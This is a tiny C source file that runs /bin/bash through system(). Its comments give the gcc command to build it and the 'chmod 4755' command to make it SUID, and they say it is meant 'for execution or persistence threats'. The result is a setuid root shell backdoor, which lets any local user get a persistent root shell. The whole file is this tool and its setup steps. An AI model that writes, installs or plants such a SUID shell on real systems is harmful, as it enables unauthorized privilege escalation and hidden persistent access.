// Use this for execution
// or persistence threats
// gcc shell_spawn.c -o shell_spawn
// SUID - chmod 4755 shell_spawn
#include<stdlib.h>
#include<stdio.h>
int main(void){
  system("/bin/bash");
  return 0;
}
